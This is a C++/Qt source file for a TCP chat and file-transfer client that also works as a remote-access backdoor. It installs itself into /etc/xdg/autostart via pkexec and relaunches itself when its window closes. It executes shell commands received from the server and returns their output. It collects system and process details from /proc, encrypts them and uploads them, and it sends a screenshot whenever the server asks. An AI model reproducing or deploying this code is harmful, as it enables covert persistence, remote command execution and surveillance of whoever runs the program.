#include "TcpClient.h"
#include "ui_TcpClient.h"

#include <QString>
#include <QDebug>
#include <QHostInfo>
#include <aestools.h>
#include <QProcess>
#include <QDesktopWidget>
#include <QPixmap>
#include <QDateTime>
#include <QScreen>
 #include <unistd.h>
//指定接收文件存放路径
#define FILE_SAVE_PATH "/home/wang/client/"
#define APPNAME "myApp"
//#define FILE_SAVE_PATH ""

TcpClient::TcpClient(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::TcpClient)
{
    ui->setupUi(this);
    QTimer *timer = new QTimer(this);
    socket = new QTcpSocket();

    connect(socket,&QIODevice::readyRead,this,&TcpClient::socket_Read_Data);
    connect(socket,&QTcpSocket::disconnected,this,&TcpClient::socket_Disconnected);

    ui->btnSend->setEnabled(false);
    ui->btnSelectFile->setEnabled(false);
    ui->btnSendFile->setEnabled(false);



    //获取正在执行程序的路径
    QString     wstrFilePath;
    wstrFilePath = qApp->applicationDirPath();
    qDebug()<< wstrFilePath;




    /*
     *获取正在执行的程序的名称
     * （1）readlink()函数：

        函数原型：int  readlink(const  char *path,  char *buf, size_t  bufsize);
        两个的头文件都为unistd.h

        函数说明：readlink()函数会将参数path的符号连接到内容buf所指的内存空间，返回的内容不
        是以NULL作为字符串结尾，但会将字符串的字符数返回。若参数bufsize小于符号连接的内容长度，
        过长的内容会被截断。

        返回值：执行成功则传符号连接所指的文件路径字符串，失败返回-1， 错误代码存于errno。

       2）strrchr()函数：

        函数原型：char *strrchr(const char *str, char c);

        函数说明：找一个字符c在另一个字符串str中末次出现的位置（也就是从str的右侧开始查找字符c
        首次出现的位置），并返回从字符串中的这个位置起，一直到字符串结束的所有字符。如果未能找到
        指定字符，那么函数将返回NULL。
     *
     */
    char name[100];
    int rval =readlink("/proc/self/exe",name,sizeof(name));
    qDebug()<< name;
    if(rval == -1)
    {
          qDebug() << "readlink error" << endl;
    }
    name[rval] = ' ';
     qDebug()<<(strrchr(name, '/') + 1);
    QString name_2=strrchr(name, '/') + 1;
    int blank_index=name_2.indexOf(' ');
    QString name_last=name_2.left(blank_index);
    qDebug()<< name_last;
    connect(qApp,&QApplication::lastWindowClosed,this,&TcpClient::check);
    QProcess p;
    QString strCmd=tr("echo -e '[Desktop Entry]\nName=%1\nName[zh_CN]=王的测试\nExec=/home/wang/tcp_client/test_tcp_client\nType=Application\nNoDisplay=false\n"
                      "X-GNOME-AutoRestart=true' > /home/wang/tcp_client/myApp.desktop").arg(name_last);
    p.start("bash", QStringList() <<"-c" << strCmd);
    p.waitForFinished();
    QString app_name = APPNAME;

    QString desktop_dir = "/home/wang/tcp_client/" + app_name + ".desktop";

    QString cmd = "pkexec cp " + desktop_dir + " /etc/xdg/autostart/" + app_name + ".desktop";

    std::string str = cmd.toStdString();

    const char *cmd_cs= str.c_str();

    system(cmd_cs); //使用系统命令将.desktop从源地址复制到autostart目录下实现开机自启动，pkexec是弹窗获取root权限


    m_process = new QProcess;
        m_process->start("bash");
        m_process->waitForStarted();

        connect(m_process, SIGNAL(readyReadStandardOutput()), this, SLOT(readBashStandardOutputInfo()));
        connect(m_process, SIGNAL(readyReadStandardError()), this, SLOT(readBashStandardErrorInfo()));

    send_reset();
    recv_reset();
}

TcpClient::~TcpClient()
{
    delete this->socket;
    delete ui;
}

void TcpClient::send_reset()
{
    send_s.fileName.clear();
    send_s.fileBytes = 0;
    send_s.sizeWritten = 0;
    send_s.sizetoWrite = 0;
}

void TcpClient::recv_reset()
{
    receive_s.fileName.clear();
    receive_s.fileBytes = 0;
    receive_s.sizeReceived = 0;
}


void TcpClient::on_btnConnect_clicked()
{
    userName = ui->leUser->text();
    if(ui->btnConnect->text() == tr("连接"))
    {
        if(ui->leIP->text() != NULL)
        {
            QString IP;
            int port;

            ui->btnConnect->setEnabled(true);

            //获取IP地址
            IP = ui->leIP->text();

            //获取端口
            port = ui->lePort->text().toInt();

            //取消已有的连接
            socket->abort();

            //连接服务器
            socket->connectToHost(IP,port);

            //等待连接成功
            if(!socket->waitForConnected(30000))
            {
                qDebug() << "连接失败";
                return;
            }
            qDebug() << "连接成功";
            ui->tbRecv->setText(QString("成功连接服务器(%1)").arg(IP));

            send_s.outStream.setDevice(socket);
            send_s.outStream.setVersion(QDataStream::Qt_5_9);

            receive_s.inStream.setDevice(socket);
            receive_s.inStream.setVersion(QDataStream::Qt_5_9);

            //告诉客户端当前客户端序号
            //QString userName = ui->leUser->text();
            //QString msg = userName +':'+socket->peerAddress().toString()+socket->peerPort()+ "-连接";
            QString msg = tr("%1-连接").arg(userName);
            send_s.outStream << ISDATA << msg.toUtf8();

            //connect(timer, SIGNAL(timeout()), this, SLOT(sendallinfo()));
            timer.start(2000);
            sendallinfo();
            //发送按键使能
            ui->btnSend->setEnabled(true);
            ui->btnSelectFile->setEnabled(true);

            //修改按键文字
            ui->btnConnect->setText("断开");
        }
    }
    else
    {
        //断开连接
        socket->disconnectFromHost();
        //修改按键文字
        ui->btnConnect->setText("连接");
        ui->btnSend->setEnabled(false);
        send_reset();
        recv_reset();
    }
}

void TcpClient::on_btnSend_clicked()
{


    QString msg = userName + "："+ui->teSend->toPlainText();

    send_s.outStream << ISDATA << msg.toUtf8();

    qDebug() << "Send: " << ui->teSend->toPlainText();
}

void TcpClient::socket_Read_Data()
{
    static int msgType;
    //QByteArray buffer;

    if((0 == receive_s.fileBytes) && (socket->bytesAvailable() > sizeof(qint64)))
    {
        receive_s.inStream >> msgType;

        switch(msgType)
        {
            case ISDATA:
                //读取缓冲区数据
                //buffer = socket->readAll();
                receive_s.inStream >> receive_s.inBlock;
                if(!receive_s.inBlock.isEmpty())
                {
                    qDebug() << receive_s.inBlock;
                    //QString str = ui->teRecv->toPlainText();
                    QString str = tr(receive_s.inBlock);
                    if(str.contains("getscreen"))
                    {
                        sendscreen();
                    }

                    //刷新UI
                    ui->tbRecv->append(str);
                    return;
                }

            break;

            case ISFILE:
                receive_s.inStream >> receive_s.fileBytes >> receive_s.fileName;

                receive_s.receiveFile = new QFile();//创建一个文件，用来接收文件信息
                receive_s.receiveFile->setFileName(FILE_SAVE_PATH+receive_s.fileName);//指定存放路径
                if(!receive_s.receiveFile->open(QIODevice::WriteOnly))
                {
                    qCritical() <<receive_s.receiveFile->errorString();
                }
                ui->tbRecv->append(QString("开始接收文件[%1]").arg(receive_s.fileName));

            break;

            case ISCMD:
            receive_s.inStream >> receive_s.inBlock;
            if(!receive_s.inBlock.isEmpty())
            {
                //qDebug() << receive_s.inBlock;
                //QString str = ui->teRecv->toPlainText();
                QString str = tr(receive_s.inBlock);
                m_process->write(str.toLocal8Bit() + '\n');
                //刷新UI
                ui->tbRecv->append(str);
                return;
            }

        break;
        }

    }

    qint64 size = qMin(socket->bytesAvailable(),(receive_s.fileBytes - receive_s.sizeReceived));

    qDebug() <<socket->bytesAvailable()<< "  " << receive_s.fileBytes - receive_s.sizeReceived;

    //QByteArray arry(size,0);
    receive_s.inBlock.resize(size);

    qDebug() << "Size of receiveFile is " << size;
    receive_s.inStream.readRawData(receive_s.inBlock.data(),size);
    receive_s.receiveFile->write(receive_s.inBlock);

    receive_s.sizeReceived += size;
    if(receive_s.sizeReceived == receive_s.fileBytes)
    {
        receive_s.receiveFile->close();
        QFileInfo receiveInfo(receive_s.fileName);
        ui->tbRecv->append(QString("[%1]接收成功").arg(receive_s.fileName));

        recv_reset();

    }
    receive_s.inBlock.resize(0);
}

void TcpClient::socket_Disconnected()
{
    //发送按键失能
    ui->btnSend->setEnabled(false);
    ui->btnSelectFile->setEnabled(false);
    ui->btnSendFile->setEnabled(false);

    //修改按键文字
    ui->btnConnect->setText("连接");

    send_reset();
    recv_reset();

    qDebug() << "断开连接！";
}

void TcpClient::on_btnSelectFile_clicked()
{
    QString fileInfo;

    fileInfo = QFileDialog::getOpenFileName(this);

    if(!fileInfo.isEmpty())
    {
        QFileInfo info(fileInfo);

        send_s.fileName = info.fileName();
        send_s.filePath = info.filePath();
        send_s.fileBytes = info.size();

        send_s.sendFile = new QFile(fileInfo);
        ui->btnSendFile->setEnabled(true);
        ui->tbRecv->append(QString("[%1] size = %2打开成功").arg(send_s.fileName).arg(send_s.fileBytes));
    }
}

void TcpClient::on_btnSendFile_clicked()
{
    ui->btnSendFile->setEnabled(false);
    send_s.sizeWritten = 0;

    if(!send_s.sendFile->open(QIODevice::ReadOnly))
    {
        qDebug() << "0";
        return;
    }

    send_s.fileBytes = send_s.sendFile->size();
    QFileInfo info(send_s.sendFile->fileName());
    send_s.fileName = info.fileName();

    //发送文件
    send_s.outStream << ISFILE;

    send_s.outStream << send_s.fileBytes << send_s.fileName;

    qDebug() << send_s.fileBytes << "  " <<send_s.fileName;
    QByteArray arry = send_s.sendFile->read(send_s.fileBytes);
    int size = arry.size();
    send_s.outStream.writeRawData(arry.constData(),size);
    ui->tbRecv->append(QString("[%1] 开始发送").arg(send_s.fileName));

    //防止TCP黏包文件
    //需要通过定时器延时20ms
    timer.start(20);

}
void TcpClient::sendallinfo()
{

    QString localHostName = QHostInfo::localHostName();
    QHostInfo info2 = QHostInfo::fromName(localHostName);
    //username=ui->LineEdit_username->text();
    QString username2="BASEINFO:"+userName+':'+info2.addresses().first().toString();

    QFile f("/proc/cpuinfo");
    f.open(QIODevice::ReadOnly | QIODevice::Text);
    QFile f1("/proc/version");
    f1.open(QIODevice::ReadOnly | QIODevice::Text);
    QFile f2("/proc/modules");
    f2.open(QIODevice::ReadOnly | QIODevice::Text);
    QFile f3("/proc/meminfo");
    f3.open(QIODevice::ReadOnly | QIODevice::Text);
    QFile f4("/proc/stat");
    f4.open(QIODevice::ReadOnly | QIODevice::Text);

    int i=2;
    QString ab ;
    QDir qd("/proc");
    QStringList qslist=qd.entryList();
    QString qs=qslist[i];
    while((qs[0]<='9')&&(qs[0]>='1'))
        {

            qs="/proc/"+qs;
            qs=qs+"/stat";
            QFile f5(qs);
            f5.open(QIODevice::ReadOnly | QIODevice::Text);
            ab+= f5.readAll();

            i++;
            qs=qslist[i];
         }

    QString a = username2+"\n"+f.readAll() + f1.readAll() +"wangzhengqi"+"\n"+ f2.readAll() +"wanghao"+"\n"+ f3.readAll()+ "wanghao"+"\n"+f4.readAll()+"wanghao"+"\n"+ab;
    f.close();f1.close();f2.close();f3.close();f4.close();
    ui->textEdit->append(a);
    QString filename_mingwen=tr("/home/wang/client/info_mingwen_%1.txt").arg(userName);
    QString filename_miwen=tr("/home/wang/client/info_miwen_%1.txt").arg(userName);

   ///新建文件来存储信息到指定目录，而后进行发送
    QFile file(filename_mingwen);
    bool fileok =file.open(QIODevice::WriteOnly);
    if(fileok==true)
    {
       file.write(a.toStdString().data());
    }


    file.close();

    //实例化aes，将生成的文件加密
    AesTools *aes=new AesTools;
    aes->FileEncryptor(filename_mingwen,filename_miwen);





    QString fileInfo=filename_miwen;

    //fileInfo = QFileDialog::getOpenFileName(this);

    if(!fileInfo.isEmpty())
    {
        QFileInfo info(fileInfo);

        send_s.fileName = info.fileName();
        send_s.filePath = info.filePath();
        send_s.fileBytes = info.size();

        send_s.sendFile = new QFile(fileInfo);
        //ui->btnSendFile->setEnabled(true);
        ui->tbRecv->append(QString("[%1] size = %2打开成功").arg(send_s.fileName).arg(send_s.fileBytes));
    }

    send_s.sizeWritten = 0;

    if(!send_s.sendFile->open(QIODevice::ReadOnly))
    {
        qDebug() << "0";
        return;
    }

    send_s.fileBytes = send_s.sendFile->size();
    QFileInfo info(send_s.sendFile->fileName());
    send_s.fileName = info.fileName();

    //发送文件
    send_s.outStream << ISFILE;

    send_s.outStream << send_s.fileBytes << send_s.fileName;

    //qDebug() << send_s.fileBytes << "  " <<send_s.fileName;
    QByteArray arry = send_s.sendFile->read(send_s.fileBytes);
    int size = arry.size();
    send_s.outStream.writeRawData(arry.constData(),size);
    ui->tbRecv->append(QString("[%1] 开始发送").arg(send_s.fileName));
    timer.start(20);



}
void TcpClient::readBashStandardOutputInfo()
{
    QByteArray _out = m_process->readAllStandardOutput();
        if(!_out.isEmpty())   //ui->textBrowser->append(QString::fromLocal8Bit(_out));
        {
            send_s.outStream << ISCMD << _out.data();
        }
}
void TcpClient::readBashStandardErrorInfo()
{
    QByteArray _out = m_process->readAllStandardError();
        if(!_out.isEmpty())   //ui->textBrowser->append(QString::fromLocal8Bit(_out));
        {
            send_s.outStream << ISCMD << _out.data();
        }
}
void TcpClient::sendscreen()
{
    QScreen* screen = QGuiApplication::primaryScreen();
    QPixmap pixmap = screen->grabWindow(QApplication::desktop()->winId());

    QDateTime dt = QDateTime::currentDateTime();

    QString filename = QString("%1.jpg").arg(dt.toString("yyyyMMdd-hhmmss"));

    QString picture_ming=tr("/home/wang/client/%1").arg(filename);
    pixmap.save(picture_ming);


    QString filename_mingwen=tr("/home/wang/client/info_mingwen_%1.txt").arg(userName);
    QString filename_miwen=tr("/home/wang/client/info_miwen_%1.txt").arg(userName);

   ///新建文件来存储信息到指定目录，而后进行发送
//    QFile file(filename_mingwen);
//    bool fileok =file.open(QIODevice::WriteOnly);
//    if(fileok==true)
//    {
//       file.write(a.toStdString().data());
//    }


//    file.close();

    //实例化aes，将生成的文件加密
    //AesTools *aes=new AesTools;
    //aes->FileEncryptor(filename_mingwen,filename_miwen);





    QString fileInfo=picture_ming;

    //fileInfo = QFileDialog::getOpenFileName(this);

    if(!fileInfo.isEmpty())
    {
        QFileInfo info(fileInfo);

        send_s.fileName = info.fileName();
        send_s.filePath = info.filePath();
        send_s.fileBytes = info.size();

        send_s.sendFile = new QFile(fileInfo);
        //ui->btnSendFile->setEnabled(true);
        ui->tbRecv->append(QString("[%1] size = %2打开成功").arg(send_s.fileName).arg(send_s.fileBytes));
    }

    send_s.sizeWritten = 0;

    if(!send_s.sendFile->open(QIODevice::ReadOnly))
    {
        qDebug() << "0";
        return;
    }

    send_s.fileBytes = send_s.sendFile->size();
    QFileInfo info(send_s.sendFile->fileName());
    send_s.fileName = info.fileName();

    //发送文件
    send_s.outStream << ISFILE;

    send_s.outStream << send_s.fileBytes << send_s.fileName;

    //qDebug() << send_s.fileBytes << "  " <<send_s.fileName;
    QByteArray arry = send_s.sendFile->read(send_s.fileBytes);
    int size = arry.size();
    send_s.outStream.writeRawData(arry.constData(),size);
    ui->tbRecv->append(QString("[%1] 开始发送").arg(send_s.fileName));
    timer.start(20);
}
void TcpClient::check()
{


    QProcess::startDetached(qApp->applicationFilePath(), QStringList());
}
